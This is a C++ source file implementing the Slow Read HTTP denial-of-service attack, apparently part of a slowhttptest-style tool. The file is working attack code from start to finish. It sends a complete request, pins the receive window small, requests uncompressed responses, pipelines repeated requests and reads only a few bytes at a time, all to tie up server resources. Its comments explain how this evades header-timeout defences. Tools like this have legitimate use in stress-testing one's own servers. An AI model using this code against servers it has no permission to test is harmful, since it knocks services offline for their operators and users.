// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/slow_read.hpp"

#include <algorithm>
#include <cstddef>

namespace slowhttp {

SlowRead::SlowRead(const Config& cfg)
    : cfg_(cfg),
      request_(build_request()),
      read_interval_(std::chrono::duration_cast<Millis>(cfg.read_interval)),
      read_len_(static_cast<std::size_t>(cfg.read_len < 1 ? 1 : cfg.read_len)),
      rng_(std::random_device{}()),
      per_conn_read_(static_cast<std::size_t>(cfg.connections), 0) {}

ConnOptions SlowRead::conn_options(ConnId /*id*/) {
  int lo = std::max(1, cfg_.window_lower);
  int hi = std::max(lo, cfg_.window_upper);
  std::uniform_int_distribution<int> dist(lo, hi);
  ConnOptions opts;
  opts.recv_buffer = dist(rng_);
  return opts;
}

void SlowRead::on_open(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < per_conn_read_.size())
    per_conn_read_[id] = 0;
}

Action SlowRead::on_connect(ConnId /*id*/) {
  // Send the whole request immediately -- it is entirely well-formed, which is
  // what makes this slip past header-timeout defenses -- then go quiet and let
  // the response pile up against our tiny window.
  return Action::send(request_, read_interval_);
}

Action SlowRead::on_timer(ConnId /*id*/) {
  // Sip a few bytes, just enough to keep the connection from being idle-timed-out
  // by some intermediary, and re-arm. Everything else stays in the server's buffer.
  return Action::read(read_len_, read_interval_);
}

Action SlowRead::on_readable(ConnId id, const char* /*data*/, std::size_t len) {
  bytes_read_ += len;
  if (id >= 0 && static_cast<std::size_t>(id) < per_conn_read_.size())
    per_conn_read_[id] += len;
  // The next read is already scheduled by the Action::read() that produced this.
  return Action::idle();
}

std::string SlowRead::build_request() const {
  std::string one;
  one.reserve(256);
  one += cfg_.effective_verb();
  one += ' ';
  one += cfg_.request_target();
  one += " HTTP/1.1\r\n";
  one += "Host: " + cfg_.target.host_in_url() + "\r\n";
  one += "User-Agent: " + cfg_.user_agent + "\r\n";
  one += "Accept: " + cfg_.accept + "\r\n";
  // Ask for an uncompressed response: the bigger the body the server has to push
  // through our pinched window, the longer it stays stuck. Compression would work
  // against the attack.
  one += "Accept-Encoding: identity\r\n";
  // Keep-alive so a pipelined burst (-k) is answered on this one connection.
  one += "Connection: keep-alive\r\n";
  one += cfg_.caller_headers();
  one += "\r\n";  // complete request, unlike Slowloris

  // Pipelining: stack -k copies so a keep-alive server queues several responses
  // and has that much more data it cannot flush to us.
  int k = cfg_.pipeline_factor < 1 ? 1 : cfg_.pipeline_factor;
  std::string full;
  full.reserve(one.size() * static_cast<std::size_t>(k));
  for (int i = 0; i < k; ++i) full += one;
  return full;
}

}  // namespace slowhttp
